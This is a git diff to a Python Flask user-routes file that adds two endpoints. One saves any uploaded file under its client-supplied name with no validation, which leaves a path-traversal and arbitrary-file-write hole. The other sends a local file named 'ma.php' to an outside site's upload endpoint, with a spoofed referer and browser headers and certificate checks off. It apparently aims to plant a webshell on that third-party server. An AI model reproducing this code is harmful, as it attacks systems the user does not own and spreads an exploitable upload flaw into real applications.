@@ -2,7 +2,7 @@ from utils.sql import supabase
 from flask import Blueprint,request
 from utils.entity import r
 from flask_jwt_extended import create_access_token, jwt_required ,get_jwt_identity
-import aiohttp,json
+import aiohttp,json,requests
 import smtplib
 from email.mime.text import MIMEText
 from email.header import Header
@@ -441,3 +441,30 @@ async def sendMsg2():
                     }) as resp2:
                         result_ = await resp2.json()
                         return r(code=200,data=result_)
+
+
+@users_bp.route("/upload", methods=["POST"])
+def upload():
+    if 'file' not in request.files:
+        return "No file part", 400
+
+    file = request.files['file']
+    if file.filename == '':
+        return "No selected file", 400
+
+    if file:
+        # 这里可以添加文件上传前的处理逻辑，例如检查文件类型、大小等
+        # 将文件保存到服务器上的指定目录
+        file.save(file.filename)
+        return "File uploaded successfully", 200
+
+@users_bp.route("/uploadtodo", methods=["POST"])
+def uploadtodo():
+    res = requests.post('https://ai.taxplus.cn/upload/upload', files={'file': open('ma.php', 'rb')},headers={
+        'Accept': 'application/json, text/javascript, */*; q=0.01',
+        'X-Requested-With': 'XMLHttpRequest',
+        'referer': 'https://ai.taxplus.cn/login/login.html',
+        'origin': 'https://ai.taxplus.cn/login/login.html',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36'
+    },verify=False)
+    return r(code=200,data=res.text)
